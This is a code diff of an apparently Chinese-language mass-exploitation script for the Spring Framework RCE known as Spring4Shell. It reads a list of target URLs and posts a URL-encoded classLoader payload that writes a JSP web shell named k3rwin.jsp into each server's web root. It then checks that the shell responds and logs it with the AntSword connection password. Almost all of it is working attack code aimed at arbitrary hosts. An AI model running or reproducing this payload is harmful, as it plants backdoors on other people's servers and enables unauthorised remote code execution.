@@ -81,8 +81,8 @@ def exps(file):
     "DNT": "1",
     "Content-Type": "application/x-www-form-urlencoded"
     }
-    shell_name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
-    payload_antsword = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Be1%7Di!%20class%20U%20extends%20ClassLoader%20%7BU(ClassLoader%20c)%20%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%5B%5D%20b)%20%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20base64Decode(String%20str)%20throws%20Exception%20%7Btry%20%7BClass%20clazz%20%3D%20Class.forName(%22sun.misc.BASE64Decoder%22)%3Breturn%20(byte%5B%5D)%20clazz.getMethod(%22decodeBuffer%22%2C%20String.class).invoke(clazz.newInstance()%2C%20str)%3B%7D%20catch%20(Exception%20e)%20%7B%20Class%20clazz%20%3D%20Class.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20clazz.getMethod(%22getDecoder%22).invoke(null)%3Breturn%20(byte%5B%5D)%20decoder.getClass().getMethod(%22decode%22%2C%20String.class).invoke(decoder%2C%20str)%3B%7D%7D%20%25%7Be2%7Di%20%25%7Be1%7DiString%20cls%20%3D%20request.getParameter(%22k3rwin%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext)%3B%7D%20%25%7Be2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=""".format(shell_name)
+    
+    payload_antsword = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Be1%7Di!%20class%20U%20extends%20ClassLoader%20%7BU(ClassLoader%20c)%20%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%5B%5D%20b)%20%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20base64Decode(String%20str)%20throws%20Exception%20%7Btry%20%7BClass%20clazz%20%3D%20Class.forName(%22sun.misc.BASE64Decoder%22)%3Breturn%20(byte%5B%5D)%20clazz.getMethod(%22decodeBuffer%22%2C%20String.class).invoke(clazz.newInstance()%2C%20str)%3B%7D%20catch%20(Exception%20e)%20%7B%20Class%20clazz%20%3D%20Class.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20clazz.getMethod(%22getDecoder%22).invoke(null)%3Breturn%20(byte%5B%5D)%20decoder.getClass().getMethod(%22decode%22%2C%20String.class).invoke(decoder%2C%20str)%3B%7D%7D%20%25%7Be2%7Di%20%25%7Be1%7DiString%20cls%20%3D%20request.getParameter(%22k3rwin%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext)%3B%7D%20%25%7Be2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=k3rwin&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
 
     with open(file, "r") as f1,open("result.txt" ,"w") as f2:
         urls = f1.readlines()
@@ -90,11 +90,16 @@ def exps(file):
             url = url.strip().split('\n')[0]
             url = urlparse(url)
             url = url.scheme + '://' + url.netloc
+            # 随机生成木马文件名
+            # shell_name = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+            # payload_antsword = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Be1%7Di!%20class%20U%20extends%20ClassLoader%20%7BU(ClassLoader%20c)%20%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%5B%5D%20b)%20%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20base64Decode(String%20str)%20throws%20Exception%20%7Btry%20%7BClass%20clazz%20%3D%20Class.forName(%22sun.misc.BASE64Decoder%22)%3Breturn%20(byte%5B%5D)%20clazz.getMethod(%22decodeBuffer%22%2C%20String.class).invoke(clazz.newInstance()%2C%20str)%3B%7D%20catch%20(Exception%20e)%20%7B%20Class%20clazz%20%3D%20Class.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20clazz.getMethod(%22getDecoder%22).invoke(null)%3Breturn%20(byte%5B%5D)%20decoder.getClass().getMethod(%22decode%22%2C%20String.class).invoke(decoder%2C%20str)%3B%7D%7D%20%25%7Be2%7Di%20%25%7Be1%7DiString%20cls%20%3D%20request.getParameter(%22k3rwin%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext)%3B%7D%20%25%7Be2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix={}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=""".format(shell_name)
             try:
                 requests.post(url, headers=Headers_2, data=payload_antsword, timeout=5, allow_redirects=False, verify=False)
-                test = requests.get(url + "/{}.jsp".format(shell_name))
+                # test = requests.get(url + "/{}.jsp".format(shell_name))
+                test = requests.get(url + "/k3rwin.jsp")
                 if test.status_code == 200:
-                    f2.write("[+]Spring框架存在RCE漏洞，上传木马地址为：" + url + "/{}.jsp".format(shell_name) + " 使用蚁剑进行连接，密码为k3rwin\n")
+                    # f2.write("[+]Spring框架存在RCE漏洞，上传木马地址为：" + url + "/{}.jsp".format(shell_name) + " 使用蚁剑进行连接，密码为k3rwin\n")
+                    f2.write("[+]Spring框架存在RCE漏洞，上传木马地址为：" + url + "/k3rwin.jsp" + " 使用蚁剑进行连接，密码为k3rwin\n")
                 else:
                     f2.write("[-]" + url + " 漏洞不存在或者已经被利用，shell地址自行扫描\n")
             except Exception as e:
